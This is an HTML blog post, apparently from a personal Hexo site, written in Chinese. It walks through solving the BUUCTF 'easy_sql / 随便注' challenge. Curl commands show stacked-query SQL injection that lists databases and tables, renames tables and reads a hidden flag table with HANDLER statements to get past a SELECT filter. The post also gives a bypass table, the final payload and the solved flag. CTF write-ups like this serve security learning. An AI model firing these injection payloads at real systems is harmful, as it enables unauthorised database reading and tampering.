@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="CTF SQL注入 - 随便注题目信息 题目名称: easy_sql &#x2F; 随便注 题目类型: SQL注入 题目URL: http:&#x2F;&#x2F;3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81&#x2F; FLAG: flag{7acd36c9-1cbb-4e30-8ee5-339726d381d2}  题目描述页面提示：”取材于某次真实环境渗透，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="4-sql注入-随便注">
+<meta property="og:url" content="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/index.html">
+<meta property="og:site_name" content="zhaochoudecat">
+<meta property="og:description" content="CTF SQL注入 - 随便注题目信息 题目名称: easy_sql &#x2F; 随便注 题目类型: SQL注入 题目URL: http:&#x2F;&#x2F;3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81&#x2F; FLAG: flag{7acd36c9-1cbb-4e30-8ee5-339726d381d2}  题目描述页面提示：”取材于某次真实环境渗透，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-02T16:56:08.062Z">
+<meta property="article:author" content="zhaochoudecat">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>4-sql注入-随便注</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2026/05/02/BUUCTF/WEB/7-knife/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2026/05/02/%E9%9D%B6%E6%9C%BA/QQGroup/111/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&text=4-sql注入-随便注"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&is_video=false&description=4-sql注入-随便注"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=4-sql注入-随便注&body=Check out this article: https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&name=4-sql注入-随便注&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-SQL%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.</span> <span class="toc-text">CTF SQL注入 - 随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9D%E6%AD%A5%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 初步探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A1%AE%E8%AE%A4SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 确认SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A3%80%E6%B5%8B%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 检测过滤关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. 堆叠查询探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8B%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. 查看表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%96%91%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. 查看可疑表的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4%E8%8E%B7%E5%8F%96flag"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 绕过select过滤获取flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%951%EF%BC%9A%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">尝试1：预处理语句（失败）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%952%EF%BC%9A%E9%87%8D%E5%91%BD%E5%90%8D%E8%A1%A8%EF%BC%88%E5%A4%87%E9%80%89%E6%96%B9%E6%A1%88%EF%BC%89"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">尝试2：重命名表（备选方案）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%953%EF%BC%9Ahandler%E8%AF%AD%E5%8F%A5%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%81%EF%BC%89"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">尝试3：handler语句（成功！）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">知识点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%EF%BC%88Stacked-Queries%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 堆叠查询（Stacked Queries）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL-MariaDB-%E7%89%B9%E6%AE%8A%E8%A1%A8%E5%90%8D%E5%A4%84%E7%90%86"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. MySQL&#x2F;MariaDB 特殊表名处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Handler%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">3. Handler语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.4.4.</span> <span class="toc-text">4. 常用绕过技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%A1%A8%E9%87%8D%E5%91%BD%E5%90%8D%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.5.</span> <span class="toc-text">5. 表重命名攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4Payload"><span class="toc-number">1.5.</span> <span class="toc-text">完整Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%90%AF%E7%A4%BA"><span class="toc-number">1.6.</span> <span class="toc-text">题目启示</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        4-sql注入-随便注
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">zhaochoudecat</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-05-01T16:00:00.000Z" itemprop="datePublished">2026-05-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="CTF-SQL注入-随便注"><a href="#CTF-SQL注入-随便注" class="headerlink" title="CTF SQL注入 - 随便注"></a>CTF SQL注入 - 随便注</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
+<li><strong>题目名称</strong>: easy_sql &#x2F; 随便注</li>
+<li><strong>题目类型</strong>: SQL注入</li>
+<li><strong>题目URL</strong>: <a target="_blank" rel="noopener" href="http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/">http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/</a></li>
+<li><strong>FLAG</strong>: <code>flag{7acd36c9-1cbb-4e30-8ee5-339726d381d2}</code></li>
+</ul>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>页面提示：”取材于某次真实环境渗透，只说一句话：开发和安全缺一不可”<br>页面注释：”sqlmap是没有灵魂的”</p>
+<hr>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-初步探测"><a href="#1-初步探测" class="headerlink" title="1. 初步探测"></a>1. 初步探测</h3><p>首先访问题目页面，发现是一个输入框，提示”姿势”，查看源码发现是GET请求，参数名为<code>inject</code>。</p>
+<p><strong>测试正常输入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-确认SQL注入"><a href="#2-确认SQL注入" class="headerlink" title="2. 确认SQL注入"></a>2. 确认SQL注入</h3><p><strong>测试单引号闭合：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论</strong>：存在SQL注入，数据库是MariaDB。</p>
+<h3 id="3-检测过滤关键字"><a href="#3-检测过滤关键字" class="headerlink" title="3. 检测过滤关键字"></a>3. 检测过滤关键字</h3><p>尝试使用<code>union select</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;union select 1,2-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论</strong>：<code>select|update|delete|drop|insert|where|.</code>等关键字被过滤。</p>
+<h3 id="4-堆叠查询探测"><a href="#4-堆叠查询探测" class="headerlink" title="4. 堆叠查询探测"></a>4. 堆叠查询探测</h3><p>由于关键字被过滤，尝试堆叠查询（多语句注入）：</p>
+<p><strong>查看所有数据库：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;show databases;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回结果包含以下数据库：</p>
+<ul>
+<li>ctftraining</li>
+<li>information_schema</li>
+<li>mysql</li>
+<li>performance_schema</li>
+<li>supersqli  ← 可疑数据库</li>
+<li>test</li>
+</ul>
+<h3 id="5-查看表结构"><a href="#5-查看表结构" class="headerlink" title="5. 查看表结构"></a>5. 查看表结构</h3><p><strong>查看ctftraining数据库的表：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use ctftraining;show tables;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>发现FLAG_TABLE，但字段默认值为”not_flag”，排除。</p>
+<p><strong>查看supersqli数据库的表：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show tables;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现两个表：</p>
+<ul>
+<li><code>1919810931114514</code>  ← 数字命名的表，非常可疑</li>
+<li><code>words</code></li>
+</ul>
+<h3 id="6-查看可疑表的结构"><a href="#6-查看可疑表的结构" class="headerlink" title="6. 查看可疑表的结构"></a>6. 查看可疑表的结构</h3><p><strong>查看words表结构：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show columns from words;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>结果：id(int), data(varchar)</p>
+<p><strong>查看数字表结构（注意反引号）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;show columns from \`1919810931114514\`;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键发现</strong>：该表有一个字段叫<code>flag</code>！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-绕过select过滤获取flag"><a href="#7-绕过select过滤获取flag" class="headerlink" title="7. 绕过select过滤获取flag"></a>7. 绕过select过滤获取flag</h3><p>由于<code>select</code>被过滤，尝试以下方法：</p>
+<h4 id="尝试1：预处理语句（失败）"><a href="#尝试1：预处理语句（失败）" class="headerlink" title="尝试1：预处理语句（失败）"></a>尝试1：预处理语句（失败）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from \`1919810931114514\`;&#x27;);prepare stmt from @sql;execute stmt;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>返回过滤提示：<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></p>
+<h4 id="尝试2：重命名表（备选方案）"><a href="#尝试2：重命名表（备选方案）" class="headerlink" title="尝试2：重命名表（备选方案）"></a>尝试2：重命名表（备选方案）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;rename table words to words1;rename table \`1919810931114514\` to words;-- &quot;</span></span><br></pre></td></tr></table></figure>
+<p>可以执行成功，但没有直接返回数据。</p>
+<h4 id="尝试3：handler语句（成功！）"><a href="#尝试3：handler语句（成功！）" class="headerlink" title="尝试3：handler语句（成功！）"></a>尝试3：handler语句（成功！）</h4><p>MySQL&#x2F;MariaDB的<code>handler</code>语句可以直接读取表数据，无需使用select。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1&#x27;;use supersqli;handler \`1919810931114514\` open;handler \`1919810931114514\` read first;-- &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>成功获取flag：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;7acd36c9-1cbb-4e30-8ee5-339726d381d2&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-堆叠查询（Stacked-Queries）"><a href="#1-堆叠查询（Stacked-Queries）" class="headerlink" title="1. 堆叠查询（Stacked Queries）"></a>1. 堆叠查询（Stacked Queries）</h3><p>在SQL注入中，使用分号<code>;</code>分隔多个SQL语句，可以执行额外的查询。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show databases; --</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-MySQL-MariaDB-特殊表名处理"><a href="#2-MySQL-MariaDB-特殊表名处理" class="headerlink" title="2. MySQL&#x2F;MariaDB 特殊表名处理"></a>2. MySQL&#x2F;MariaDB 特殊表名处理</h3><p>当表名是数字或包含特殊字符时，需要用<strong>反引号</strong>包裹：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Handler语句"><a href="#3-Handler语句" class="headerlink" title="3. Handler语句"></a>3. Handler语句</h3><p>MySQL的<code>handler</code>语句提供了一种直接访问表存储引擎的接口，可以绕过SELECT关键字限制：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler table_name <span class="keyword">open</span>;      <span class="comment">-- 打开表</span></span><br><span class="line">handler table_name read <span class="keyword">first</span>; <span class="comment">-- 读取第一条记录</span></span><br><span class="line">handler table_name read next;  <span class="comment">-- 读取下一条记录</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-常用绕过技巧"><a href="#4-常用绕过技巧" class="headerlink" title="4. 常用绕过技巧"></a>4. 常用绕过技巧</h3><table>
+<thead>
+<tr>
+<th>过滤</th>
+<th>绕过方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>select</td>
+<td>handler语句、预编译语句、重命名表+alter字段</td>
+</tr>
+<tr>
+<td>set&#x2F;prepare</td>
+<td>concat+char编码、十六进制编码</td>
+</tr>
+<tr>
+<td>where</td>
+<td>HAVING、LIMIT OFFSET</td>
+</tr>
+</tbody></table>
+<h3 id="5-表重命名攻击"><a href="#5-表重命名攻击" class="headerlink" title="5. 表重命名攻击"></a>5. 表重命名攻击</h3><p>当原查询只返回特定字段时，可以将flag表重命名为原查询的表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> words <span class="keyword">to</span> words1;</span><br><span class="line">rename <span class="keyword">table</span> `<span class="number">1919810931114514</span>` <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter table</span> words change flag id <span class="type">varchar</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="完整Payload"><a href="#完整Payload" class="headerlink" title="完整Payload"></a>完整Payload</h2><p><strong>获取flag的最终payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;use supersqli;handler `1919810931114514` open;handler `1919810931114514` read first;-- </span><br></pre></td></tr></table></figure>
+
+<p>URL编码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3e2916c7-99d8-47f7-9b53-88374d309e2c.node5.buuoj.cn:81/?inject=1%27%3Buse%20supersqli%3Bhandler%20%601919810931114514%60%20open%3Bhandler%20%601919810931114514%60%20read%20first%3B--%20</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="题目启示"><a href="#题目启示" class="headerlink" title="题目启示"></a>题目启示</h2><ol>
+<li><strong>开发和安全缺一不可</strong>：过滤了常见SQL关键字，但忽略了其他SQL语句（如handler）</li>
+<li><strong>sqlmap不是万能的</strong>：手工注入能发现自动化工具遗漏的漏洞点</li>
+<li><strong>堆叠查询的危险性</strong>：即使某些关键字被过滤，堆叠查询仍可能导致数据泄露</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-SQL%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.</span> <span class="toc-text">CTF SQL注入 - 随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9D%E6%AD%A5%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 初步探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A1%AE%E8%AE%A4SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 